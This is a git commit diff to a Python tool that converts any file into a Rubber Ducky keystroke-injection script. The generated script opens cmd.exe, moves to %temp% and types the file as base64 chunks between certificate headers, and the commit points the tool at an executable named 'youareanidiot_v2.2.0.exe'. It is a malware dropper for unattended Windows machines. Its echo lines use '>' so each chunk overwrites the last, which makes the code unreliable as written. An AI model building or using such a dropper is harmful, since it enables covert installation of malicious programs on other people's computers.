044a0ee94dab0208d8b9142318029ab6b4b62d93
theredenemy <1234corbin.1234ad@gmail.com>
2026-07-21 12:11:51 -0700

    new file:   .gitignore 	modified:   filetoduckyscript.py

--- filetoduckyscript.py
+++ filetoduckyscript.py
@@ -5,21 +5,23 @@ def make_ducky_script(file):
     import os
     import base64
     import shutil
-    filesdirremovedot = file.replace('.', '')
+    basename = os.path.basename(file)
+    filesdirremovedot = basename.replace('.', '')
     filesdir = f"{filesdirremovedot}_files"
     if os.path.isdir(filesdir) == True:
         shutil.rmtree(filesdir)
     os.mkdir(filesdir)
     base = open(file, "rb")
     base1 = base.read()
+    
     scriptfilename = f"{filesdir}/{filesdirremovedot}_output.txt"
     base64_encoded = base64.b64encode(base1).decode("utf-8")
-    ducky = open(f"{scriptfilename}", "w")
+    ducky = open(scriptfilename, "w")
     duckyscriptstart = f'''DELAY 1000
 GUI r
 DELAY 500
 STRING cmd.exe
-DELAY 500
+DELAY 1000
 ENTER
 DELAY 750
 STRING cd %temp%
@@ -37,24 +39,18 @@ ENTER
 STRING echo hello>{filesdirremovedot}_base64
 DELAY 500
 ENTER
-STRING notepad {filesdirremovedot}_base64
-DELAY 500
-ENTER
-DELAY 750
-CTRL a
-BACKSPACE
 DELAY 300\n'''
     ducky.write(duckyscriptstart)
     input_string = base64_encoded
     chunk_size = 64
     timeout = 400
     enddelay = 10000
-    ducky.write("STRING -----BEGIN CERTIFICATE-----\nENTER\n")
+    ducky.write(f"STRING echo -----BEGIN CERTIFICATE----->{filesdirremovedot}_base64\nENTER\n")
     ducky.write(f"DELAY {timeout}\n")
     for i in range(0, len(input_string), chunk_size):
             chunk = input_string[i:i + chunk_size]
-            ducky.write(f"STRING {chunk}\nDELAY {timeout}\nENTER\n")
-    ducky.write("STRING -----END CERTIFICATE-----\nENTER\n")
+            ducky.write(f"STRING echo {chunk}>{filesdirremovedot}_base64\nDELAY {timeout}\nENTER\n")
+    ducky.write(f"STRING echo -----END CERTIFICATE----->{filesdirremovedot}_base64\nENTER\n")
     duckyscriptend = f'''DELAY 10000
 CTRL s
 DELAY {enddelay}
@@ -71,5 +67,5 @@ ENTER'''
 
 
 if __name__ == "__main__":
-    make_ducky_script("test.txt")
+    make_ducky_script("E:\\Files\\youareanidiot_v2.2.0.exe")
 
